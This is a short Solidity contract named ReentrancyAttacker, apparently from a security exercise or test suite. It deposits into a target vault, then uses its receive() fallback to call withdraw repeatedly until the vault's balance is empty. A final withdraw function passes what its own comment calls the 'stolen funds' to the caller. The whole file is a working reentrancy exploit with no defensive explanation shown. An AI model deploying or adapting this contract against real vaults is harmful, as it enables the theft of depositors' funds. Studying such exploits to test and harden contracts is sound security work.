// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./IVault.sol";

contract ReentrancyAttacker {
    IVault immutable targetContract;

    constructor(address targetContract_) {
        targetContract = IVault(targetContract_);
    }

    function drain() external payable {
        targetContract.deposit{value: msg.value}();
        targetContract.withdraw();
    }

    receive() external payable {
        if (address(targetContract).balance > 0) {
            targetContract.withdraw();
        }
    }

    // after attack finished the exploiter will withdraw stolen funds
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
